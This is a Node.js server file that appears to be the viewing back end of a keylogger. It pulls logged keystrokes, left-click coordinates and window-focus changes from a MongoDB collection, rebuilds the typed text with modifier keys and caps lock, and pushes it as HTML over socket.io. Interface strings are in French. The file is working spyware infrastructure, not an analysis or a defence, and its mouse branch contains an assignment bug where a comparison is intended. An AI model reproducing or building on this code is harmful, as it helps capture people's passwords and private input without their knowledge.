
if (process.argv.length != 4)
{
    console.log("\033[31mUsage: node server_node.js <id> <token>\033[0m");
    process.exit(13);
}
var logs = "log" + process.argv[2] + "_" + process.argv[3];

var http = require('http');
var net = require('net');
var MongoClient = require('mongodb').MongoClient;

httpServer = http.createServer(function(req, res) {
    res.end('end');
});

httpServer.listen(42666);

var io = require('socket.io').listen(httpServer);

MongoClient.connect("mongodb://localhost:27017/spider", function(err, db) {
    if(!err) {
	console.log("We are connected");
    }
    
    io.sockets.on('connection', function(socket) {
    	console.log("New user connected");
	
	var collection = db.collection(logs);
	
	var onPressCtrl = false;
	var onPressAlt = false;
	var onPressShift = false;
	var onCapsLock = false;
	var res = "<div class='newFocus'>";
	
	collection.find({"value": {$ne: "MOVE" } }).sort({"time":1}).toArray(function(err, docs) {
	    for (var i = 0; i < docs.length; i++) {
	    	if (docs[i].input == 0) /* keystroke */
	    	{
	    	    if (docs[i].state == 1)
	    	    {
	    		if (docs[i].value == "Space")
	    		    res += (" ");
	    		else if (docs[i].value == "Enter")
	    		    res += ("\n");
	    		else if (docs[i].value == "Ctrl" || docs[i].value == "Alt" || docs[i].value == "Shift")
	    		{
			    if (docs[i].value == "Ctrl" && onPressCtrl == false && onPressAlt == false && onPressShift == false)
			    {
	    			onPressCtrl = true;
	    			res += ('--[');
			    }
			    else if (docs[i].value == "Alt" && onPressCtrl == false && onPressAlt == false && onPressShift == false)
			    {
	    			onPressAlt = true;
	    			res += ('--[');
			    }
			    else if (docs[i].value == "Shift" && onPressCtrl == false && onPressAlt == false && onPressShift == false)
			    {
				onPressShift = true;
	    			res += ('--[');
			    }
	    		    res += (docs[i].value);
	    		}
	    		else if (docs[i].value == "Backspace")
	    		{
	    		    res += ("\b");
	    		}
	    		else if (docs[i].value == "Caps Lock")
	    		{
	    		    onCapsLock = !onCapsLock;
	    		}
	    		else
	    		{
	    		    if (onPressCtrl == true || onPressAlt == true || onPressShift == true)
	    			res += (' ' + docs[i].value);
	    		    else
	    		    {
	    			if (onCapsLock == false)
	    			    res += (docs[i].value.toLowerCase());
	    			else
	    			    res += (docs[i].value);
	    		    }
				
	    		}
	    	    }
	    	    else if (docs[i].state == 2)
	    	    {

			if (docs[i].value == "Ctrl" && onPressCtrl == true)
			{
			    onPressCtrl = false;
	    		    res += (']--');
			}
			else if (docs[i].value == "Alt" && onPressAlt == true)
			{
			    onPressAlt = false;
	    		    res += (']--');
			}
			else if (docs[i].value == "Shift" && onPressShift == true)
			{
			    onPressShift = false;
	    		    res += (']--');
			}
	    	    }
	    	}
	    	else if (docs[i].input == 1) /* MOUSE */
	    	{
		    if (docs[i].value ="LEFT")
			res += "<br/><br/>--{clique gauche au coordonnées (" + docs[i].coord_x + ", " + docs[i].coord_y + ")}--<br/><br/>";
	    	}
	    	else if (docs[i].input == 2) /* FOCUS */ 
	    	{
	    	    res += ("</div><br/><br/>" + "<div class='newFocus'><b>Changement de fenêtre : " + docs[i].value + "</b><span class=\"timestamp\">" + new Date(docs[i].time) + "</span><br/>");
	    	}
	    }
	    res += "</div>"

	    console.log('end');

	    socket.emit('listened', res);
	});
    });
});



